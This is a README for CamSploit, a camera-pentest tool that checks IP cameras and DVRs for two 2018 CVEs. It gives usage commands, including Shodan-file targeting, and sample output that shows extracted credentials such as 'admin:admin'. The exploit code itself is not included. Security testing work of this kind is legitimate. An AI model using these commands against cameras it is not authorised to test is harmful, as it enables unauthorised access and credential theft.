![alt tag](https://raw.githubusercontent.com/maxpowersi/CamSploit/master/Resources/icon.png)
# CamSploit v1.0.1
CamSploit is an exploiting tool that helps in the IP camera pentest. It was developed using Dot Net Core (compatible with Windows and Linux), tested in windows 10 and Ubuntu 16. It has got a modular collection of exploits. You can create your own modules to expands the currents exploits. CamSploit is distributed under the GNU GPLv3 license. In the next weeks, it will be added more than 10 exploits.
## Usage
```
dotnet CamSploit.dll --help
CamSploit 1.0.1
Copyright (C) 2018 CamSploit
ERROR(S):
Required option 'rhost' is missing.
Required option 'rhost-list' is missing.
Required option 'rhost-shodan-file' is missing.
Required option 'show-exploit' is missing.

  --rhost                Required. Single host in format IP:Port, example 192.168.0.1:80

  --rhost-list           Required. Text file with one single full host (IP:Port) per line.

  --rhost-shodan-file    Required. JSON Shodan data file, example: data.json

  --show-exploit         Required. Show all exploits in the application or the description of one exploit.

  --output               (Default: output.camsploit.txt) Output file (it is optional).

  --exploits             List of exploits separated by spaces, example CVE_2018_9995,CVE-2018-10676

  --help                 Display this help screen.

  --version              Display version information.

```
## Example
```
dotnet CamSploit.dll  --show-exploit  ALL
CVE-2018-9995
CVE-2018-10676

dotnet CamSploit.dll  --show-exploit  CVE-2018-9995
CVE-2018-9995: Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'

dotnet CamSploit.dll  --rhost  192.168.0.1:8080
Testing CVE-2018-9995 for Cam 192.168.0.1:8080
The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-9995
Testing CVE-2018-10676 for Cam 192.168.0.1:8080
The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-10676

dotnet CamSploit.dll  --rhost  192.168.0.1:8080 --exploits CVE-2018-9995
Testing CVE-2018-9995 for Cam 192.168.0.1:8080
The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-9995

dotnet CamSploit.dll  --rhost  192.168.0.1:8080 --exploits CVE-2018-9995,CVE-2018-10676 --output "result.txt"
Testing CVE-2018-9995 for Cam 192.168.0.1:8080
The Cam 192.168.0.1:8080 is vulnerable for the CVE-2018-9995 the result is admin:admin
Testing CVE-2018-10676 for Cam 192.168.0.1:8080
The Cam 192.168.0.1:8080 is vulnerable for the CVE-2018-10676 the result is {null}:{null} - Please to get the username and password check the following memory dump:
```
